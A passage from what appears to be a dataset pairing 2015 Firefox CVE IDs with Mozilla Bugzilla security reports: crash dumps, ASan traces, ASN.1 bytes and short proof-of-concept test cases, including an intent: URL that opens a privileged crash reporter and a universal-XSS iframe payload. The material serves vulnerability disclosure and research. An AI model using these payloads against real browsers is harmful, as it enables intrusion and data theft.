ptr [rdx+rcx] --- No source file ------------------------------------------------------------- > 000007FEF6BBC634 mov r10,qword ptr [rdx+rcx+8] 000007FEF6BBC639 add rcx,20h 000007FEF6BBC63D mov qword ptr [rcx-20h],rax 000007FEF6BBC641 mov qword ptr [rcx-18h],r10 000007FEF6BBC645 mov rax,qword ptr [rdx+rcx-10h] 000007FEF6BBC64A mov r10,qword ptr [rdx+rcx-8] 000007FEF6BBC64F dec r9 000007FEF6BBC652 mov qword ptr [rcx-10h],rax 000007FEF6BBC656 mov qword ptr [rcx-8],r10 000007FEF6BBC65A jne MoveSmall+190h (07FEF6BBC630h) 000007FEF6BBC65C and r8,1Fh 000007FEF6BBC660 jmp mcpy00aa+73h (07FEF6BBC457h) with registers: RAX = 433A0000433A0000 RBX = 000000000023B230 RCX = 000000003D48F820 RDX = 000000006404F5E0 RSI = 0000000000000000 RDI = 00000000494C1800 R8 = 000000001FFFFFF8 R9 = 0000000000F5908F R10 = 433A0000433A0000 R11 = 000000003BFB0A20 R12 = 00000000111BEDC0 R13 = 000000002AFBB400 R14 = 000000003BFB0A20 R15 = 0000000000000004 RIP = 000007FEF6BBC634 RSP = 000000000023B0D8 RBP = 000000000023B171 EFL = 00000212 So the last data it wrote was at 0x000000003D48F820 - 8 == 0x000000003D48F818 This means that memcpy wrote 0x000000003D48F818 - 0x000000003BFB0A20 == 0x00000000014DEDF8 bytes, beginning at the buffer's base, extending far beyond its end, including the memory from which the video driver read its pointer, and terminating only when the OS suspended the process's threads due to the exception in the video driver thread. ------------------------------------------------------------------------------------------------------ [0] Extract poc.js, poc.htm, and glMatrix-0.9.5.min.js from the attachment. Save them all in the same folder and load poc.htm from that folder. [1] This is set by VertexDataManager::VertexDataManager using the constant INITIAL_STREAM_BUFFER_SIZE. [2] It's probably easiest to reproduce obviously adverse effects from this bug by running 2 windows of \"Dynamic Procedural Terrain\" and one of \"Bill Nye Reading Mean Tweets\". You might need to try it several times. You can witness the overwriting directly by putting a breakpoint on VertexBuffer11::storeVertexAttributes and stepping into its call to vertexFormatInfo.copyFunction. [3] See poc.js line 149, which assigns the (float) attribute array elements the value 0xba. This is represented as 0x433a0000."
      }
    ],
    "CVE-2015-7180": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1191463",
        "title": "Mishandling return status in ReadbackResultWriterD3D11::Run might cause memory-safety bug",
        "description": "ReadbackResultWriterD3D11::Run (gfx\\layers\\d3d11\\ReadbackManagerD3D11.cpp) mishandles failure status from ID3D10Texture2D::Map. This might cause it to use a pointer and other data from uninitialized memory to create a surface, which is then used to read (and possibly write?) data from/to memory: 41: NS_IMETHODIMP Run() 42: { 43: D3D10_TEXTURE2D_DESC desc; 44: mTask->mReadbackTexture->GetDesc(&desc); 45: 46: D3D10_MAPPED_TEXTURE2D mappedTex; 47: // We know this map will immediately succeed, as we've already mapped this 48: // copied data on our task thread. 49: HRESULT hr = mTask->mReadbackTexture->Map(0, D3D10_MAP_READ, 0, &mappedTex); 50: 51: if (FAILED(hr)) { 52: mTask->mSink->ProcessReadback(nullptr); 53: } 54: 55: { 56: RefPtr<DataSourceSurface> surf = 57: Factory::CreateWrappingDataSourceSurface((uint8_t*)mappedTex.pData, mappedTex.RowPitch, 58: IntSize(desc.Width, desc.Height), 59: SurfaceFormat::B8G8R8X8); 60: 61: mTask->mSink->ProcessReadback(surf); 62: 63: MOZ_ASSERT(surf->hasOneRef()); 64: } 65: 66: mTask->mReadbackTexture->Unmap(0); 67: 68: return NS_OK; 69: } First lines 47-8 assert that Map cannot fail, but then lines 51-3 attempt to handle failure. However, they do so imcompletely (should there be a \"return <some status>;\" following line 52? Or has an \"else\" accidentally been elided from line 54?) leaving lines 57-9 using the uninitialized struct mappedTex. Despite the comments on line 47-8, probably OOM, device failure, and possibly other conditions can cause Map to fail even under the conditions under which Run runs."
      }
    ],
    "CVE-2015-7181": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1192028",
        "title": "ASan: use-after-poison in sec_asn1d_parse_leaf()",
        "description": "Tim shared tools with me from bug 1185033."
      }
    ],
    "CVE-2015-7182": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1202868",
        "title": "ASN.1 decoder heap overflow when decoding constructed OCTET STRING that mixes indefinite and definite length encodings",
        "description": "I discovered this when investigating bug 1192028. Consider the following ASN.1: 24 0A [OCTET STRING | CONSTRUCTED] [length is 10 bytes] 24 80 [OCTET STRING | CONSTRUCTED] [indefinite length] 04 01 01 [OCTET STRING] [length is 1] [value is 1] 00 00 [end of indefinite length contents marker] 04 01 02 [OCTET STRING] [length is 1] [value is 2] If I understand correctly, this is valid ASN.1 and is equivalent to 04 02 01 02 (i.e. an OCTET STRING of length 2 with value 01 02). However, under ASAN using a setup similar to bug 1192028 (see attached), this results in a use-after-poison that I believe could be parleyed into a heap overflow."
      }
    ],
    "CVE-2015-7183": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1205157",
        "title": "NSPR overflow in PL_ARENA_ALLOCATE can lead to crash (under ASAN), potential memory corruption",
        "description": "Consider the following (simple) application, which uses NSS (rather than NSPR directly) #include <secport.h> int main(int argc, char** argv) { PLArenaPool* temparena = NULL; temparena = PORT_NewArena(2048); if (temparena == NULL) return -1; // Fatal allocation error void* foo = PORT_ArenaAlloc(temparena, 808464432); if (foo == NULL) return 0; // Benign allocation failure (too large) PORT_FreeArena(temparena, PR_FALSE); return 0; } Run the above application with ASAN_OPTIONS=verbosity=3:allocator_may_return_null=1 ./a.out And see it crash with a message somewhat similar to the followin: Trying to unpoison memory region [0xf4900fa0, 0x24c03fd0) The crash is on the PORT_ArenaAlloc call, which, if you dig into further, is in the call to PL_ARENA_ALLOCATE ( http://mxr.mozilla.org/nss/source/lib/util/secport.c#272 ) The crash itself is in the expansion of the macro PL_MAKE_MEM_UNDEFINED, called / expanded at http://mxr.mozilla.org/nspr/source/lib/ds/plarena.h#149 The problem is that PL_ARENA_ALLOCATE doesn't check for overflow before determining whether or not enough memory exists, and as a result, overflows. The crash is ASAN yelling at the overflow. Specifically, http://mxr.mozilla.org/nspr/source/lib/ds/plarena.h#142 and http://mxr.mozilla.org/nspr/source/lib/ds/plarena.h#143 Example values of _p and _nb in my case _p = 4109373344 _nb = 808464432 _q = _p + _nb = 622870480 _q < _p, therefore NSPR assumes the memory can be used directly from _p (that it already allocated enough), and Bad Things Happen. What's supposed to happen is that it would call PL_ArenaAllocate and let that yell at the user for the (large) allocation. Instead, it sets _a->avail = _q, which includes a wide swath of memory not allocated, and then returns _p to the caller, as if the large allocation succeeded. In ASAN mode, this crashes when PL_MAKE_MEM_UNDEFINED is called, because _q < _p. In non-ASAN mode, no crashes, just wild writes."
      }
    ],
    "CVE-2015-7186": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1193027",
        "title": "file: URIs SOP Bypass: Local private data into the local firefox folder \"file:///(...)/cache/[*******].default/cache2/entries/\" can be stolen using an automatic download of a html file and interact with this html file downloaded",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0 Build ID: 20150630154324 Steps to reproduce: With firefox for Android it's possible to download automaticly an html file with normal configuration using a PHP remote file. When you go on the HTML file automaticly downloaded and interact with it , it's possible to steal private data into the local firefox folder : \"file:///data/data/org.mozilla.firefox/cache/[*******].default/cache2/entries/\" which contains sensitive data like partial or full content of a website visited, token verification key , what the user has searched on google or other website (showed in the demonstration video that i will uploaded), and very much others private data which can lead to very confidential data stealing. This sensitive data stealing is possible because when you download a file which is into the firefow folder : \"file:///data/data/org.mozilla.firefox/cache/[*******].default/cache2/entries/\" , it is downloaded into the download folder and canbe read by an html file and sent on a malicious website scheduled to save data sent on this website. I have tested this vulnerability on a Samsung Galaxy S5 4g+ Lolipop Android version 5.0.2 and a Samsung Galaxy Tab A Lolipop version 5.0.2 with the last public version of Firefox for Android : Firefox 39.0 I will upload a video for show you how to interact with the testcase. Actual results: Very sensitive data into the local firefox folder \"file:///data/data/org.mozilla.firefox/cache/[*******].default/cache2/entries/\" can be stolen leading to private data theft. Expected results: All files into the the local folder \"file:///data/data/org.mozilla.firefox/cache/[*******].default/cache2/entries/\" should not be downloaded into the download folder because this can lead to sensitive data stealing. Vulnerability bug reported by Security researcher Jordi Chancel."
      }
    ],
    "CVE-2015-7189": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1205900",
        "title": "Heap Buffer Overflow in nsJPEGEncoder::ConvertHostARGBRow()",
        "description": "Convert the canvas to blob in DOM attribute modified event can cause memory corruption. Reproduce test case: <html><body><canvas id=\"canvas0\"></canvas></body><script> var canvas0=document.getElementById(\"canvas0\"); var ctx=canvas0.getContext(\"2d\"); canvas0.addEventListener(\"DOMAttrModified\", function(event) {canvas0.toBlob(function(){},\"image/jpeg\", 1);}, true); canvas0.setAttribute(\"height\",470) setTimeout(function(){location.reload()},300); </script></html> Steps to reproduce: 1. Open the attached test case (Uaf_ConvertHostARGBRow_Repro.html) in Firefox browser. 2. Firefox crashes at random address in nsJPEGEncoder::ConvertHostARGBRow() First-chance exception at 0x104D34C8 (xul.dll) in firefox.exe: 0xC0000005: Access violation reading location 0x1A690002. Unhandled exception at 0x104D34C8 (xul.dll) in firefox.exe: 0xC0000005: Access violation reading location 0x1A690002. Firefox version: 43.0a1 (2015-09-09) Call stack: xul.dll!nsJPEGEncoder::ConvertHostARGBRow(const unsigned char * aSrc, unsigned char * aDest, unsigned int aPixelWidth) Line 364 C++ xul.dll!nsJPEGEncoder::InitFromData(const unsigned char * aData, unsigned int aLength, unsigned int aWidth, unsigned int aHeight, unsigned int aStride, unsigned int aInputFormat, const nsAString_internal & aOutputOptions) Line 175 C++ xul.dll!mozilla::dom::ImageEncoder::GetInputStream(int aWidth, int aHeight, unsigned char * aImageBuffer, int aFormat, imgIEncoder * aEncoder, const wchar_t * aEncoderOptions, nsIInputStream * * aStream) Line 329 C++ xul.dll!mozilla::dom::ImageEncoder::ExtractDataInternal(const nsAString_internal & aType, const nsAString_internal & aOptions, unsigned char * aImageBuffer, int aFormat, const mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> aSize, mozilla::layers::Image * aImage, nsICanvasRenderingContextInternal * aContext, nsIInputStream * * aStream, imgIEncoder * aEncoder) Line 363 C++ > xul.dll!mozilla::dom::EncodingRunnable::ProcessImageData(unsigned __int64 * aImgSize, void * * aImgData) Line 169 C++ xul.dll!mozilla::dom::EncodingRunnable::Run() Line 202 C++ xul.dll!nsThread::ProcessNextEvent(bool aMayWait, bool * aResult) Line 874 C++ xul.dll!NS_ProcessNextEvent(nsIThread * aThread, bool aMayWait) Line 277 C++ xul.dll!mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate * aDelegate) Line 355 C++ xul.dll!MessageLoop::RunHandler() Line 228 C++ xul.dll!MessageLoop::Run() Line 202 C++ xul.dll!nsThread::ThreadFunc(void * aArg) Line 365 C++ nss3.dll!_PR_NativeRunThread(void * arg) Line 419 C nss3.dll!pr_root(void * arg) Line 90 C [External Code] [Frames below may be incorrect and/or missing, no symbols loaded for msvcr120.dll] Checking the variables of EncodingRunnable in debugger, the 0x5a5a5a5a pattern indicates an Use After Free: - mEncoder {...} nsCOMPtr<imgIEncoder> + nsCOMPtr_base {mRawPtr=0x5a5a5a5a {...} } nsCOMPtr_base - mImage {mRawPtr=0x5a5a5a5a {mRefCnt={mValue={...} } mBackendData={mArray={mArr=0x5a5a5a62 {...} } } mImplData=...} } nsRefPtr<mozilla::layers::Image> + mRawPtr 0x5a5a5a5a {mRefCnt={mValue={...} } mBackendData={mArray={mArr=0x5a5a5a62 {{...}, {...}, {...}, {...}, ...} } } ...} mozilla::layers::Image * - stream {...} nsCOMPtr<nsIInputStream> + nsCOMPtr_base {mRawPtr=0x00000000 <NULL> } nsCOMPtr_base - this 0x194b4af6 {mType={mStorage=0x194b4b16 L\"\" } mOptions={mStorage=0x194b4baa L\"婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚... } ...} mozilla::dom::EncodingRunnable * + nsRunnable {mRefCnt={mValue={...} } _mOwningThread={mThread=0x00000000 } } nsRunnable + mType {mStorage=0x194b4b16 L\"\" } nsAutoString + mOptions {mStorage=0x194b4baa L\"婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚婚... } nsAutoString + mImageBuffer {mRawPtr=0x5a5a5a5a <Error reading characters of string.> } nsAutoArrayPtr<unsigned char> + mImage {mRawPtr=0x5a5a5a5a {mRefCnt={mValue={...} } mBackendData={mArray={mArr=0x5a5a5a62 {...} } } mImplData=...} } nsRefPtr<mozilla::layers::Image> + mEncoder {...} nsCOMPtr<imgIEncoder> + mEncodingCompleteEvent {mRawPtr=0x5a5a5a5a {mImgSize=??? mType={mStorage=0x5a5a5a86 <Error reading characters of string.> } ...} } nsRefPtr<mozilla::dom::EncodingCompleteEvent> mFormat 1515870810 int + mSize {...} const mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> mUsingCustomOptions true (90) bool"
      }
    ],
    "CVE-2015-7190": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1208520",
        "title": "Firefox Search on Android allows to open an arbitrary activity with Fennec's privilege",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.42 Safari/537.36 Steps to reproduce: The following commit introduced a security bug that allows any web contents to open an arbitrary activity with Fennec's privilege. https://hg.mozilla.org/mozilla-central/rev/05645d479d89 This code is used by search widget on Android when a search result navigates to an intent: URL. Then this code directly use given intent: URL for starting activity. This is wrong it should be handled like Bug 851693 (e.g., adding Intent.CATEGORY_BROWSABLE). The following is a possible exploitation scenario. 1. Open a search engine URL http://mallory.csrf.jp/search.html on Fennec 2. Long tap an text input in a page and register it as a search engine 3. In settings menu, choose it as a default search engine for search widget 4. Searche any words via search widget on the registered search engine, then the search result open a following intent: URL intent://#Intent;action=org.mozilla.gecko.reportCrash;package=org.mozilla.fennec;component=org.mozilla.fennec/org.mozilla.gecko.CrashReporter;S.minidumpPath=%2fsystem%2fbuild.prop;end 5. Fennec opens the link and the private hidden crash reporter activity is shown by Fennec's own privilege. 6. Then the parameter minidumpPath=%2fsystem%2fbuild.prop given by the content makes crash reporter to open /system/build.prop file on Fennec's privilege Then the following log may be put on adb if you use an Android device that OS version is before 4.4. I/GeckoCrashReporter(29235): moving /system/build.prop to /data/data/org.mozilla.fennec/files/mozilla/Crash Reports/pending/build.prop I attached a PDF introducing steps to reproduce."
      }
    ],
    "CVE-2015-7191": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1208956",
        "title": "Universal XSS with browser_fallback_url extra in intent: URL on Fennec",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36 Steps to reproduce: The following source code for Fennec allows universal XSS attack with the browser_fallback_url extra in intent: URL. http://lxr.mozilla.org/mozilla-central/source/mobile/android/base/IntentHelper.java#186 Please see the live demo by Fennec. https://mallory.csrf.jp/intent/fallback.html In this page, parent document injects script code \"alert(document.domain)\" to nsa.gov opened in the iframe like this. <iframe src=\"https://www.nsa.gov\" onload=\"this.src='intent://any#Intent;scheme=httpz;S.browser_fallback_url=javascript%3Aalert%28document.domain%29;end'\"> Actual results: The injected code to nsa.gov via \"S.browser_fallback_url=javascript%3Aalert%28document.domain%29\" in the intent: URL is executed. Expected results: The injected code should not be executed."
      }
    ],
    "CVE-2015-7194": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1211262",
        "title": "Arbitrary memory access in libjar (libxul)",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Build ID: 20150918100310 Steps to reproduce: An arbitrary memory access was found in libjar using a specially crafted zip. It was tested in the libjar code shipped in Firefox 41 as well as Firefox 44.0a1. To reproduce this issue, find attached a test case (causing reading outside the buffers bounds in heap or stack randomly) and a JavaScript file to trigger this vulnerability in xpcshell (available in the xulrunner-sdk). This particular xpi file is rejected by Firefox if you try to install them as extension, but we believe it could be modified to have a valid install.rdf file and cause the crash in parsing of an extension to install. At this point, i think it is quite important to know if this issue can be easily exploited remotely without user intervention. Actual results: The report of a debugger (x86) is available here: $ LD_LIBRARY_PATH=\".:./plugins:.\" gdb --args ./xpcshell test_open_xpi.js $(pwd)/test.xpi Program received signal SIGSEGV, Segmentation fault. 0xb4429161 in nsJARInputStream::Read(char*, unsigned int, unsigned int*) () from ./libxul.so (gdb) bt #0 0xb4429161 in nsJARInputStream::Read(char*, unsigned int, unsigned int*) () from ./libxul.so #1 0xb3fb3cca in nsScriptableInputStream::ReadHelper(char*, unsigned int) () from ./libxul.so #2 0xb3fb3dee in nsScriptableInputStream::Read(unsigned int, char**) () from ./libxul.so #3 0xb3fcf790 in NS_InvokeByIndex () from ./libxul.so #4 0xb440bab9 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) () from ./libxul.so #5 0xb440ea7d in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) () from ./libxul.so #6 0xb5dfec24 in js::Invoke(JSContext*, JS::CallArgs const&, js::MaybeConstruct) () from ./libxul.so #7 0xb5dfa298 in Interpret(JSContext*, js::RunState&) () from ./libxul.so #8 0xb5dfe675 in js::RunScript(JSContext*, js::RunState&) () from ./libxul.so #9 0xb5dfe83a in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) () from ./libxul.so #10 0xb5dfe9b1 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) () from ./libxul.so #11 0xb613e318 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Value*) () from ./libxul.so #12 0xb613e691 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) () from ./libxul.so #13 0xb4404ebb in ProcessFile(mozilla::dom::AutoJSAPI&, char const*, _IO_FILE*, bool) () from ./libxul.so #14 0xb440529f in Process(mozilla::dom::AutoJSAPI&, char const*, bool) () from ./libxul.so #15 0xb440899b in XRE_XPCShellMain () from ./libxul.so #16 0x0804c42d in main (argc=4, argv=0xbffffb24, envp=0xbffffb38) at /builds/slave/m-cen-lx-000000000000000000000/build/src/js/xpconnect/shell/xpcshell.cpp:54 (gdb) x/i $eip => 0xb4429161 <_ZN16nsJARInputStream4ReadEPcjPj+187>: rep movsb %ds:(%esi),%es:(%edi) (gdb) info registers eax 0x2000004 33554436 ecx 0x1fde028 33415208 edx 0xaced5200 -1393733120 ebx 0xb7e4928c -1209757044 esp 0xbfffdc00 0xbfffdc00 ebp 0xbfffdc18 0xbfffdc18 esi 0xafa9a000 -1347837952 edi 0xa6821fdc -1501421604 eip 0xb4429161 0xb4429161 <nsJARInputStream::Read(char*, unsigned int, unsigned int*)+187> eflags 0x210286 [ PF SF IF RF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 and the report of Address Sanitizer (x86_64) is here: ==8811==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f3cd3729000 at pc 0x460117 bp 0x7fff821757d0 sp 0x7fff82174f90 READ of size 33554436 at 0x7f3cd3729000 thread T0 #0 0x460116 (/home/g/Apps/firefox-asan/firefox/xpcshell+0x460116) #1 0x7f3ce83a646d (libxul.so+0x333a46d) #2 0x7f3ce71a657e (libxul.so+0x213a57e) #3 0x7f3ce71a6381 (libxul.so+0x213a381) #4 0x7f3ce721a704 (libxul.so+0x21ae704) #5 0x7f3ce8328571 (libxul.so+0x32bc571) #6 0x7f3ce8327f7f (libxul.so+0x32bbf7f) #7 0x7f3ce832be9b (libxul.so+0x32bfe9b) #8 0x7f3cee569ad2 (libxul.so+0x94fdad2) #9 0x7f3cee56904c (libxul.so+0x94fd04c) #10 0x7f3cee55b0e9 (libxul.so+0x94ef0e9) #11 0x7f3cee548e50 (libxul.so+0x94dce50) #12 0x7f3cee56bbb2 (libxul.so+0x94ffbb2) #13 0x7f3cee56c83d (libxul.so+0x950083d) #14 0x7f3ceee6a06c (libxul.so+0x9dfe06c) #15 0x7f3ceee69e04 (libxul.so+0x9dfde04) #16 0x7f3ce8366b74 (libxul.so+0x32fab74) #17 0x7f3ce8366e13 (libxul.so+0x32fae13) #18 0x7f3ce830792f (libxul.so+0x329b92f) #19 0x7f3ce8305049 (libxul.so+0x3299049) #20 0x48a94f (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a94f) #21 0x7f3ce19c9ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) #22 0x48a6cc (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a6cc) 0x7f3cd3729000 is located 6144 bytes to the left of 167422-byte region [0x7f3cd372a800,0x7f3cd37535fe) freed by thread T0 here: #0 0x472ae1 (/home/g/Apps/firefox-asan/firefox/xpcshell+0x472ae1) #1 0x7f3cee193c30 (libxul.so+0x9127c30) #2 0x7f3cee66e9d3 (libxul.so+0x96029d3) #3 0x7f3ceee42a88 (libxul.so+0x9dd6a88) #4 0x7f3ce82b34c0 (libxul.so+0x32474c0) #5 0x7f3ce83445b3 (libxul.so+0x32d85b3) #6 0x7f3ce82d9958 (libxul.so+0x326d958) #7 0x7f3cec4750b4 (libxul.so+0x74090b4) #8 0x7f3ce71c5c8c (libxul.so+0x2159c8c) #9 0x7f3ce71c6bdd (libxul.so+0x215abdd) #10 0x7f3ce71c7a81 (libxul.so+0x215ba81) #11 0x7f3ce71c1226 (libxul.so+0x2155226) #12 0x7f3ce72690c4 (libxul.so+0x21fd0c4) #13 0x7f3ce724e0a4 (libxul.so+0x21e20a4) #14 0x7f3ce7240ae9 (libxul.so+0x21d4ae9) #15 0x7f3ce8304514 (libxul.so+0x3298514) #16 0x48a94f (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a94f) #17 0x7f3ce19c9ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) previously allocated by thread T0 here: #0 0x472ce1 (/home/g/Apps/firefox-asan/firefox/xpcshell+0x472ce1) #1 0x7f3cee0b8d47 (libxul.so+0x904cd47) #2 0x7f3cee0b5d75 (libxul.so+0x9049d75) #3 0x7f3cee66e8bd (libxul.so+0x96028bd) #4 0x7f3ceee42a88 (libxul.so+0x9dd6a88) #5 0x7f3ce82b34c0 (libxul.so+0x32474c0) #6 0x7f3ce83445b3 (libxul.so+0x32d85b3) #7 0x7f3ce82d9958 (libxul.so+0x326d958) #8 0x7f3cec4750b4 (libxul.so+0x74090b4) #9 0x7f3ce71c5c8c (libxul.so+0x2159c8c) #10 0x7f3ce71c6bdd (libxul.so+0x215abdd) #11 0x7f3ce71c7a81 (libxul.so+0x215ba81) #12 0x7f3ce71c1226 (libxul.so+0x2155226) #13 0x7f3ce72690c4 (libxul.so+0x21fd0c4) #14 0x7f3ce724e0a4 (libxul.so+0x21e20a4) #15 0x7f3ce7240ae9 (libxul.so+0x21d4ae9) #16 0x7f3ce8304514 (libxul.so+0x3298514) #17 0x48a94f (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a94f) #18 0x7f3ce19c9ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x0fe81a6dd1b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe81a6dd1c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe81a6dd1d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe81a6dd1e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe81a6dd1f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0fe81a6dd200:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe81a6dd210: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe81a6dd220: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe81a6dd230: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe81a6dd240: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe81a6dd250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd and here: ==8782==ERROR: AddressSanitizer: stack-buffer-underflow on address 0x7fbb49f18a20 at pc 0x460117 bp 0x7fff6f1cbb70 sp 0x7fff6f1cb330 READ of size 33554436 at 0x7fbb49f18a20 thread T0 #0 0x460116 (/home/g/Apps/firefox-asan/firefox/xpcshell+0x460116) #1 0x7fbb5e95b46d (libxul.so+0x333a46d) #2 0x7fbb5d75b57e (libxul.so+0x213a57e) #3 0x7fbb5d75b381 (libxul.so+0x213a381) #4 0x7fbb5d7cf704 (libxul.so+0x21ae704) #5 0x7fbb5e8dd571 (libxul.so+0x32bc571) #6 0x7fbb5e8dcf7f (libxul.so+0x32bbf7f) #7 0x7fbb5e8e0e9b (libxul.so+0x32bfe9b) #8 0x7fbb64b1ead2 (libxul.so+0x94fdad2) #9 0x7fbb64b1e04c (libxul.so+0x94fd04c) #10 0x7fbb64b100e9 (libxul.so+0x94ef0e9) #11 0x7fbb64afde50 (libxul.so+0x94dce50) #12 0x7fbb64b20bb2 (libxul.so+0x94ffbb2) #13 0x7fbb64b2183d (libxul.so+0x950083d) #14 0x7fbb6541f06c (libxul.so+0x9dfe06c) #15 0x7fbb6541ee04 (libxul.so+0x9dfde04) #16 0x7fbb5e91bb74 (libxul.so+0x32fab74) #17 0x7fbb5e91be13 (libxul.so+0x32fae13) #18 0x7fbb5e8bc92f (libxul.so+0x329b92f) #19 0x7fbb5e8ba049 (libxul.so+0x3299049) #20 0x48a94f (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a94f) #21 0x7fbb57f7eec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) #22 0x48a6cc (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a6cc) Address 0x7fbb49f18a20 is located in stack of thread T11 (JS Helper) at offset 0 in frame #0 0x7fbb64af130f (libxul.so+0x94d030f) This frame has 2 object(s): [32, 36) 'status' <== Memory access at offset 0 partially underflows this variable [48, 52) '' <== Memory access at offset 0 partially underflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext (longjmp and C++ exceptions *are* supported) Thread T11 (JS Helper) created by T0 here: #0 0x45f555 (/home/g/Apps/firefox-asan/firefox/xpcshell+0x45f555) #1 0x7fbb6ad15c14 (libnspr4.so+0x71c14) #2 0x7fbb6ad1572a (libnspr4.so+0x7172a) #3 0x7fbb64aefa7b (libxul.so+0x94cea7b) #4 0x7fbb64b83b88 (libxul.so+0x9562b88) #5 0x7fbb653f7170 (libxul.so+0x9dd6170) #6 0x7fbb5d68696b (libxul.so+0x206596b) #7 0x7fbb5e885761 (libxul.so+0x3264761) #8 0x7fbb5e889355 (libxul.so+0x3268355) #9 0x7fbb5e8f91ef (libxul.so+0x32d81ef) #10 0x7fbb5e8f94da (libxul.so+0x32d84da) #11 0x7fbb5e88e958 (libxul.so+0x326d958) #12 0x7fbb62a2a0b4 (libxul.so+0x74090b4) #13 0x7fbb5d77ac8c (libxul.so+0x2159c8c) #14 0x7fbb5d77bbdd (libxul.so+0x215abdd) #15 0x7fbb5d77ca81 (libxul.so+0x215ba81) #16 0x7fbb5d776226 (libxul.so+0x2155226) #17 0x7fbb5d81e0c4 (libxul.so+0x21fd0c4) #18 0x7fbb5d8030a4 (libxul.so+0x21e20a4) #19 0x7fbb5d7f5ae9 (libxul.so+0x21d4ae9) #20 0x7fbb5e8b9514 (libxul.so+0x3298514) #21 0x48a94f (/home/g/Apps/firefox-asan/firefox/xpcshell+0x48a94f) #22 0x7fbb57f7eec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) SUMMARY: AddressSanitizer: stack-buffer-underflow ??:0 ?? Shadow bytes around the buggy address: 0x0ff7e93db0f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ff7e93db100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ff7e93db110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ff7e93db120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ff7e93db130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0ff7e93db140: 00 00 00 00[f1]f1 f1 f1 04 f2 04 f3 00 00 00 00 0x0ff7e93db150: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 0x0ff7e93db160: 00 f2 f2 f2 01 f2 00 f3 f3 f3 f3 f3 00 00 00 00 0x0ff7e93db170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ff7e93db180: 00 00 00 00 00 00 00 00 00 00 00 